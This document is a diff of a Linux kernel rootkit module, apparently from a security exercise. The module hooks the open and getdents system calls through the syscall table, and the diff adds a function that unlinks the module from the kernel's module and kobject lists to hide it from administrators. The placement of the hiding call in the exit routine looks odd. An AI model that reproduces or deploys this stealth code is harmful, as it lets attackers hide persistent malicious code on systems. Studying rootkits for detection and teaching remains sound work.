@@ -62,10 +62,15 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
 	return original_call_open(pathname, flags, mode);
 }
 
-
-
-
-
+void module_hide(void)
+{
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+	
+}
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
 	int rtn = original_getdents(fd, dirp, count);
@@ -146,7 +151,8 @@ static void exit_sneaky_module(void)
 	//function address. Will look like malicious code was never there!
 	*(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
 	*(sys_call_table + __NR_open) = (unsigned long)original_open;
-	//*(sys_call_table + __NR_read) = (unsigned long)original_read;  
+	//*(sys_call_table + __NR_read) = (unsigned long)original_read; 
+	module_hide();
 
 	//Revert page to read-only
 	pages_ro(page_ptr, 1);
